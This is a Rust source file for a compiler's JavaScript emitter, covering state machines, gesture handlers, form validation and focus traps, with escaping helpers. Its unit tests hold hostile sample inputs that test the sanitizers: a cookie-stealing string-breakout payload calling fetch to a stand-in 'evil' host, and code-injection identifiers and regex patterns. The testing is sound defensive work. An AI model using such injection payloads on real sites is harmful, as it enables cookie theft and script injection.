//! JavaScript emitter — generates minimal JS for state machines and event handlers.
//!
//! Only emits JS when the IR has interactive elements (StateMachine, GestureHandler).
//! Pages without interactivity get zero JS.

use crate::compiler_ir::{
    CompiledFocusTrap, CompiledGestureHandler, CompiledStateMachine, CompilerIr,
};

/// Encode a string as a safe JS string literal (double-quoted).
///
/// `serde_json` produces a valid double-quoted literal with control
/// characters, quotes, and backslashes escaped; that literal is also a valid
/// JS string. We additionally escape `<` as `<` (which is `<` in JS) so a
/// value containing `</script>` cannot terminate the `<script>` element at HTML
/// parse time. IR strings are AI- or user-authored and must never be trusted
/// as code.
fn js_str(s: &str) -> String {
    let json = serde_json::to_string(s).unwrap_or_else(|_| "\"\"".to_string());
    json.replace('<', "\\u003c")
}

/// Sanitize an IR id into a safe JS identifier fragment. Any character that is
/// not alphanumeric or `_` becomes `_`, and a leading digit is prefixed, so an
/// id can never inject code where it is used as a variable name. Deterministic,
/// so the same id maps to the same identifier at every use site.
fn js_ident(s: &str) -> String {
    let mut out: String = s
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || c == '_' {
                c
            } else {
                '_'
            }
        })
        .collect();
    if out.chars().next().is_some_and(|c| c.is_ascii_digit()) {
        out.insert(0, '_');
    }
    if out.is_empty() {
        out.push('_');
    }
    out
}

/// Escape a string for use inside a double-quoted CSS attribute selector, so an
/// id containing a quote cannot break out of the `[data-voce-id="..."]` value.
fn css_attr_value(s: &str) -> String {
    s.replace('\\', "\\\\").replace('"', "\\\"")
}

/// Generate the JavaScript for all interactive elements.
/// Returns empty string if no interactivity is needed.
pub fn emit_js(ir: &CompilerIr) -> String {
    if ir.state_machines.is_empty()
        && ir.gesture_handlers.is_empty()
        && ir.forms.is_empty()
        && ir.focus_traps.is_empty()
    {
        return String::new();
    }

    let mut js = String::with_capacity(1024);

    // State machines
    for sm in &ir.state_machines {
        emit_state_machine(&mut js, sm);
    }

    // Gesture handlers, forms, focus traps, and initial ARIA sync all query the
    // DOM, so they run after DOMContentLoaded.
    let sms_with_aria: Vec<&CompiledStateMachine> = ir
        .state_machines
        .iter()
        .filter(|sm| !sm.state_aria.is_empty())
        .collect();
    let needs_domready = !ir.gesture_handlers.is_empty()
        || !ir.forms.is_empty()
        || !ir.focus_traps.is_empty()
        || !sms_with_aria.is_empty();
    if needs_domready {
        js.push_str("document.addEventListener('DOMContentLoaded',()=>{\n");
        // Apply each machine's initial-state ARIA before any interaction.
        for sm in &sms_with_aria {
            js.push_str(&format!("  {}_applyAria();\n", js_ident(&sm.id)));
        }
        for gh in &ir.gesture_handlers {
            emit_gesture_handler(&mut js, gh);
        }
        for form in &ir.forms {
            emit_form_validation(&mut js, form);
        }
        for trap in &ir.focus_traps {
            emit_focus_trap(&mut js, trap);
        }
        js.push_str("});\n");
    }

    js
}

fn emit_focus_trap(js: &mut String, trap: &CompiledFocusTrap) {
    let id = js_ident(&trap.id);
    let container_sel = js_str(&format!(
        "[data-voce-id=\"{}\"]",
        css_attr_value(&trap.container_node_id)
    ));
    js.push_str(&format!(
        "  const ft_{id}=document.querySelector({container_sel});\n"
    ));
    js.push_str(&format!("  if(ft_{id}){{"));
    // Block-scoped, so multiple traps don't collide.
    js.push_str("const FOCUSABLE='a[href],button:not([disabled]),input:not([disabled]),select:not([disabled]),textarea:not([disabled]),[tabindex]:not([tabindex=\"-1\"])';");
    js.push_str(&format!("let ft_{id}_prev=null;"));
    js.push_str(&format!(
        "const ft_{id}_f=()=>Array.from(ft_{id}.querySelectorAll(FOCUSABLE)).filter(el=>el.offsetParent!==null);"
    ));

    // Tab wraps within the container; Escape follows the trap's behavior.
    js.push_str(&format!("ft_{id}.addEventListener('keydown',(e)=>{{"));
    js.push_str(&format!(
        "if(e.key==='Tab'){{const f=ft_{id}_f();if(!f.length)return;const a=f[0],b=f[f.length-1];if(e.shiftKey&&document.activeElement===a){{e.preventDefault();b.focus();}}else if(!e.shiftKey&&document.activeElement===b){{e.preventDefault();a.focus();}}}}"
    ));
    match trap.escape_behavior.as_str() {
        "CloseOnEscape" => {
            let restore = if trap.restore_focus {
                format!("if(ft_{id}_prev&&ft_{id}_prev.focus)ft_{id}_prev.focus();")
            } else {
                String::new()
            };
            js.push_str(&format!(
                "else if(e.key==='Escape'){{ft_{id}.hidden=true;{restore}}}"
            ));
        }
        "FireEvent" => {
            if let (Some(sm), Some(ev)) = (&trap.escape_state_machine, &trap.escape_event) {
                js.push_str(&format!(
                    "else if(e.key==='Escape'){{{}_send({});}}",
                    js_ident(sm),
                    js_str(ev)
                ));
            }
        }
        _ => {} // NoEscape: Escape does nothing.
    }
    js.push_str("});");

    // Activate: if the container is visible at load, remember focus and move it
    // into the trap (initial focus node, else the first focusable descendant).
    let init_focus = match &trap.initial_focus_node_id {
        Some(nid) => format!(
            "ft_{id}.querySelector({})||ft_{id}_f()[0]",
            js_str(&format!("[data-voce-id=\"{}\"]", css_attr_value(nid)))
        ),
        None => format!("ft_{id}_f()[0]"),
    };
    js.push_str(&format!(
        "if(ft_{id}.offsetParent!==null){{ft_{id}_prev=document.activeElement;const init={init_focus};if(init)init.focus();}}"
    ));
    js.push_str("}\n");
}

fn emit_state_machine(js: &mut String, sm: &CompiledStateMachine) {
    let var_name = js_ident(&sm.id);

    // State variable
    js.push_str(&format!(
        "const {var_name}={{current:{}}};",
        js_str(&sm.initial_state)
    ));

    // Transition table
    js.push_str(&format!("const {var_name}_t={{"));
    for state in &sm.states {
        js.push_str(&format!("{}:{{", js_str(state)));
        for t in sm.transitions.iter().filter(|t| t.from == *state) {
            js.push_str(&format!("{}:", js_str(&t.event)));
            js.push_str(&format!("{{to:{}", js_str(&t.to)));
            if let Some(ref effect) = t.effect {
                js.push_str(&format!(",fx:{}", js_str(effect)));
            }
            js.push_str("},");
        }
        js.push_str("},");
    }
    js.push_str("};\n");

    // Per-state ARIA effects and an applier that syncs them to the DOM.
    let has_aria = !sm.state_aria.is_empty();
    if has_aria {
        js.push_str(&format!("const {var_name}_aria={{"));
        for (state, effects) in &sm.state_aria {
            js.push_str(&format!("{}:[", js_str(state)));
            for (target, attr, value) in effects {
                let sel = js_str(&format!("[data-voce-id=\"{}\"]", css_attr_value(target)));
                js.push_str(&format!("[{},{},{}],", sel, js_str(attr), js_str(value)));
            }
            js.push_str("],");
        }
        js.push_str("};\n");
        js.push_str(&format!(
            "function {var_name}_applyAria(){{const es={var_name}_aria[{var_name}.current];if(!es)return;for(const x of es){{const el=document.querySelector(x[0]);if(el)el.setAttribute(x[1],x[2]);}}}}\n"
        ));
    }

    // Transition function: update state, then re-sync ARIA.
    let apply = if has_aria {
        format!("{var_name}_applyAria();")
    } else {
        String::new()
    };
    js.push_str(&format!(
        "function {var_name}_send(e){{const t={var_name}_t[{var_name}.current]?.[e];if(!t)return;{var_name}.current=t.to;{apply}}}\n"
    ));
}

fn emit_gesture_handler(js: &mut String, gh: &CompiledGestureHandler) {
    // Activate-like gestures behave as buttons: they fire on pointer activation
    // and must also be operable from the keyboard (Enter + Space).
    let (event_type, is_activate) = match gh.gesture_type.as_str() {
        "Tap" | "Click" => ("click", true),
        "DoubleTap" => ("dblclick", true),
        "Hover" => ("mouseenter", false),
        "Focus" => ("focus", false),
        _ => ("click", true),
    };
    let id = js_ident(&gh.id);
    // The selector string is escaped for both the CSS attribute-value context
    // (inner quote) and the JS string context (outer literal).
    let selector = js_str(&format!(
        "[data-voce-id=\"{}\"]",
        css_attr_value(&gh.target_node_id)
    ));

    // Find element by data-voce-id or by DOM structure
    js.push_str(&format!(
        "  const el_{id}=document.querySelector({selector});\n"
    ));

    js.push_str(&format!("  if(el_{id}){{"));

    // Resolve the action (a state-machine send), if any. After sending, reflect
    // the machine's new current state onto the element as `data-state` so CSS
    // (`[data-state="…"]`) and scripts have a live hook — the state machine
    // otherwise never touches the DOM.
    let action = match (&gh.trigger_event, &gh.trigger_state_machine) {
        (Some(ev), Some(sm)) => {
            let sm_var = js_ident(sm);
            // Seed the initial state on the element up front.
            js.push_str(&format!(
                "el_{id}.setAttribute('data-state',{sm_var}.current);"
            ));
            Some(format!(
                "{sm_var}_send({});el_{id}.setAttribute('data-state',{sm_var}.current)",
                js_str(ev)
            ))
        }
        _ => None,
    };

    if let Some(ref act) = action {
        // Pointer/gesture activation.
        js.push_str(&format!(
            "el_{id}.addEventListener('{event_type}',()=>{{{act}}});"
        ));
        if is_activate {
            // Button-style keyboard equivalent: Enter and Space, with Space
            // preventDefault'd so it doesn't scroll the page.
            js.push_str(&format!(
                "el_{id}.addEventListener('keydown',(e)=>{{if(e.key==='Enter'||e.key===' '){{e.preventDefault();{act}}}}});"
            ));
        } else if let Some(ref key) = gh.keyboard_key {
            // Non-activate gesture with an explicit keyboard equivalent.
            js.push_str(&format!(
                "el_{id}.addEventListener('keydown',(e)=>{{if(e.key==={}){{{act}}}}});",
                js_str(key)
            ));
        }
    }

    js.push_str("}\n");
}

fn emit_form_validation(js: &mut String, form: &crate::compiler_ir::CompiledForm) {
    let form_id = &form.id;
    let var = js_ident(form_id);

    js.push_str(&format!(
        "  const {var}_form=document.getElementById({});\n",
        js_str(form_id)
    ));
    js.push_str(&format!(
        "  if({var}_form){{{var}_form.addEventListener('submit',(e)=>{{\n"
    ));
    js.push_str("    let valid=true;let firstInvalid=null;\n");

    for field in &form.fields {
        let field_id = format!("{form_id}-{}", field.name);
        let field_var = js_ident(&field.name);

        js.push_str(&format!(
            "    const {field_var}=document.getElementById({});\n",
            js_str(&field_id)
        ));
        js.push_str(&format!(
            "    const {field_var}_err=document.getElementById({});\n",
            js_str(&format!("{field_id}-error"))
        ));
        // Guard: radio/checkbox groups and hidden fields have no element at the
        // base field id, so skip value-based validation rather than crash.
        js.push_str(&format!("    if({field_var}&&{field_var}_err){{\n"));
        // Reset this field's error state before re-validating.
        js.push_str(&format!(
            "    {field_var}_err.hidden=true;{field_var}.removeAttribute('aria-invalid');\n"
        ));

        for rule in &field.validations {
            let check = match rule.rule_type.as_str() {
                "Required" => format!("!{field_var}.value.trim()"),
                "Email" => format!("!/^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/.test({field_var}.value)"),
                "MinLength" => {
                    // Bounds must be numeric — never interpolate a raw string
                    // into an expression context.
                    let min = rule
                        .value
                        .as_deref()
                        .and_then(|v| v.parse::<u64>().ok())
                        .unwrap_or(1);
                    format!("{field_var}.value.length<{min}")
                }
                "MaxLength" => {
                    let max = rule
                        .value
                        .as_deref()
                        .and_then(|v| v.parse::<u64>().ok())
                        .unwrap_or(255);
                    format!("{field_var}.value.length>{max}")
                }
                "Pattern" => {
                    // Build the regex via `new RegExp(<escaped-string>)` rather
                    // than a `/.../ ` literal, which a value containing `/` or a
                    // newline could break out of.
                    let pat = rule.value.as_deref().unwrap_or(".*");
                    format!("!new RegExp({}).test({field_var}.value)", js_str(pat))
                }
                _ => continue,
            };

            // Only the first failing rule for a field sets the message and
            // aria-invalid; later rules (and passing rules) don't clobber it.
            js.push_str(&format!(
                "    if({check}&&!{field_var}.hasAttribute('aria-invalid')){{{field_var}_err.textContent={};{field_var}_err.hidden=false;{field_var}.setAttribute('aria-invalid','true');valid=false;if(!firstInvalid)firstInvalid={field_var};}}\n",
                js_str(&rule.message)
            ));
        }
        // Close the element-exists guard opened for this field.
        js.push_str("    }\n");
    }

    // Move focus to the first invalid field so keyboard/AT users land on the error.
    js.push_str("    if(!valid){e.preventDefault();if(firstInvalid)firstInvalid.focus();}\n");
    // On a valid submit, mark the form busy and disable the submit button so the
    // interaction reads as "submitting" and can't be double-submitted.
    js.push_str(&format!(
        "    else{{{var}_form.setAttribute('aria-busy','true');const b={var}_form.querySelector('button[type=\"submit\"],button:not([type])');if(b)b.disabled=true;}}\n"
    ));
    js.push_str("  })}\n");
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn js_str_escapes_quotes_and_backslashes() {
        assert_eq!(js_str(r#"a"b"#), r#""a\"b""#);
        assert_eq!(js_str(r"a\b"), r#""a\\b""#);
        // A closing-tag sequence must not survive as literal "</script".
        assert!(!js_str("</script>").contains("</script"));
        assert!(js_str("</script>").contains("\\u003c"));
    }

    #[test]
    fn js_str_neutralizes_breakout_attempt() {
        // A hostile state name / message that tries to close the string and
        // inject code stays inside a single escaped literal.
        let hostile = "x';fetch('//evil'+document.cookie);'";
        let out = js_str(hostile);
        assert!(out.starts_with('"') && out.ends_with('"'));
        // No unescaped single-quote-driven breakout is possible; the payload is
        // one contiguous double-quoted literal.
        assert!(!out.contains("');"));
    }

    #[test]
    fn js_ident_strips_non_identifier_chars() {
        assert_eq!(js_ident("btn-1"), "btn_1");
        assert_eq!(js_ident("a;alert(1);b"), "a_alert_1__b");
        assert_eq!(js_ident("9lives"), "_9lives");
        assert_eq!(js_ident(""), "_");
    }

    #[test]
    fn css_attr_value_escapes_quote() {
        assert_eq!(css_attr_value(r#"a"b"#), r#"a\"b"#);
    }

    #[test]
    fn pattern_rule_uses_regexp_constructor() {
        use crate::compiler_ir::{CompiledForm, CompiledFormField, CompiledValidationRule};
        let form = CompiledForm {
            id: "f".into(),
            fields: vec![CompiledFormField {
                name: "u".into(),
                field_type: "text".into(),
                label: "U".into(),
                placeholder: None,
                autocomplete: None,
                validations: vec![CompiledValidationRule {
                    rule_type: "Pattern".into(),
                    // A pattern that would break out of a /.../ literal.
                    value: Some("/;fetch('x');/".into()),
                    message: "bad".into(),
                }],
                description: None,
                options: vec![],
                style: None,
            }],
            action_endpoint: None,
            action_method: "post".into(),
            progressive: false,
            layout: None,
        };
        let mut js = String::new();
        emit_form_validation(&mut js, &form);
        assert!(js.contains("new RegExp("));
        // The raw slash-delimited payload must not appear as a bare regex literal.
        assert!(!js.contains("!//;fetch"));
    }
}
